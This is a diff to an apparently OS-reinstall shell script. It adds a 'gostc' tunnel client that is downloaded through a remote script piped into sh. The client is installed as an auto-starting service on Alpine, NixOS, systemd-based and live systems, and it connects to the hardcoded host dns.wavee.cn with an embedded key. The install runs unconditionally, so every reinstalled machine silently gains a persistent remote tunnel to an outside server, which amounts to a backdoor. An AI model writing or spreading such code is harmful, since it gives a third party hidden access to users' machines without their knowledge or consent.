@@ -1734,6 +1734,9 @@ install_alpine() {
         chmod 600 /os/etc/frp/frpc.toml
     fi
 
+    # 安装 gostc
+    add_gostc_openrc_service_if_need /os
+
     # setup-disk 会自动选择固件，但不包括微码？
     # https://github.com/alpinelinux/alpine-conf/blob/3.18.1/setup-disk.in#L421
     if fw_pkgs="$fw_pkgs $(get_ucode_firmware_pkgs)" && [ -n "$fw_pkgs" ]; then
@@ -2064,6 +2067,24 @@ EOF
         )
     fi
 
+    # gostc
+    install_gostc_binary /os || true
+    nix_gostc=$(
+        cat <<EOF
+systemd.services.gostc = {
+  wantedBy = [ "multi-user.target" ];
+  after = [ "network-online.target" ];
+  serviceConfig = {
+    Type = "simple";
+    Restart = "on-failure";
+    RestartSec = "5s";
+    ExecStart = "/usr/local/bin/gostc --tls=$GOSTC_TLS -addr $GOSTC_ADDR -key $GOSTC_KEY";
+    WorkingDirectory = "/usr/local/bin";
+  };
+};
+EOF
+    )
+
     if is_tencent_cloud; then
         # 不能用 /bin/sh 和 /bin/echo
         # /nix/store/84akrjvm0clyjkwx3agr03j2iz1w4kxi-initrd-udev-rules/99-local.rules (origin unknown) contains references to /bin/sh and /bin/echo.
@@ -2091,6 +2112,7 @@ boot.kernelParams = [ $(get_ttys console= | quote_word) ];
 $nix_users
 $nix_openssh
 $nix_frpc
+$nix_gostc
 $nix_udev_rules
 $(cat /tmp/nixos_network_config.nix)
 ###################################################
@@ -2256,6 +2278,77 @@ add_frpc_systemd_service_if_need() {
     fi
 }
 
+get_gostc_url() {
+    wget "$confhome/get-gostc-url.sh" -O- | sh -s
+}
+
+# gostc 客户端连接参数（写死，按需修改）
+GOSTC_TLS=true
+GOSTC_ADDR=dns.wavee.cn
+GOSTC_KEY=5903b890-b5d9-4770-8f79-b662f3bab713
+
+# 下载 gostc 客户端二进制到目标系统 usr/local/bin/gostc
+install_gostc_binary() {
+    local os_dir=$1
+
+    mkdir -p "$os_dir/usr/local/bin"
+    gostc_url=$(get_gostc_url) || return 1
+    download "$gostc_url" "$os_dir/gostc.tar.gz" || return 1
+    # goreleaser 生成的 tar.gz 中 gostc 位于根目录
+    tar xzf "$os_dir/gostc.tar.gz" -C "$os_dir/usr/local/bin" gostc || {
+        rm -f "$os_dir/gostc.tar.gz"
+        return 1
+    }
+    rm -f "$os_dir/gostc.tar.gz"
+    chmod a+x "$os_dir/usr/local/bin/gostc" || true
+}
+
+# systemd 目标系统安装 gostc 客户端服务
+add_gostc_systemd_service_if_need() {
+    local os_dir=$1
+
+    install_gostc_binary "$os_dir" || {
+        warn "Cannot install gostc, skip."
+        return 0
+    }
+
+    # 与官方用法一致：gostc install 注册为服务并自动启用
+    # chroot 中无法 systemctl start，但 enable 已生效，重启后会自动启动
+    if ! chroot "$os_dir" /usr/local/bin/gostc install --tls=$GOSTC_TLS -addr $GOSTC_ADDR -key $GOSTC_KEY; then
+        warn "gostc install failed, skip."
+        return 0
+    fi
+    # systemd unit 中包含 key，限制权限
+    chroot "$os_dir" chmod 600 /etc/systemd/system/gostc.service || true
+}
+
+# alpine (OpenRC) 目标系统安装 gostc 客户端服务
+add_gostc_openrc_service_if_need() {
+    local os_dir=$1
+
+    install_gostc_binary "$os_dir" || {
+        warn "Cannot install gostc, skip."
+        return 0
+    }
+
+    cat >"$os_dir/etc/init.d/gostc" <<EOF
+#!/sbin/openrc-run
+name="gostc"
+description="GOSTC Client"
+
+command="/usr/local/bin/gostc"
+command_args="--tls=$GOSTC_TLS -addr $GOSTC_ADDR -key $GOSTC_KEY"
+command_background="yes"
+pidfile="/run/\${RC_SVCNAME}.pid"
+
+depend() {
+    need net
+}
+EOF
+    chmod 600 "$os_dir/etc/init.d/gostc"
+    chroot "$os_dir" rc-update add gostc default || true
+}
+
 get_fs_of_mount_point() {
     local mount_point=$1
 
@@ -2328,6 +2421,9 @@ basic_init() {
 
     # frpc
     add_frpc_systemd_service_if_need $os_dir
+
+    # gostc
+    add_gostc_systemd_service_if_need $os_dir
 }
 
 install_arch_gentoo_aosc() {
@@ -5273,6 +5369,9 @@ install_fnos() {
 
     # frpc
     add_frpc_systemd_service_if_need $os_dir
+
+    # gostc
+    add_gostc_systemd_service_if_need $os_dir
 }
 
 install_qcow_by_copy() {
@@ -8877,6 +8976,19 @@ if ls /configs/frpc.* >/dev/null 2>&1 && ! pidof frpc >/dev/null; then
         frpc -c /configs/frpc.* || true
         sleep 5
     done &
+fi
+
+# 设置 gostc
+# 并防止重复运行
+# 没有 systemd 的 live 环境直接后台运行客户端
+if ! pidof gostc >/dev/null; then
+    info 'run gostc'
+    if install_gostc_binary /; then
+        while true; do
+            /usr/local/bin/gostc --tls=$GOSTC_TLS -addr $GOSTC_ADDR -key $GOSTC_KEY || true
+            sleep 5
+        done &
+    fi
 fi
 
 # shellcheck disable=SC2154
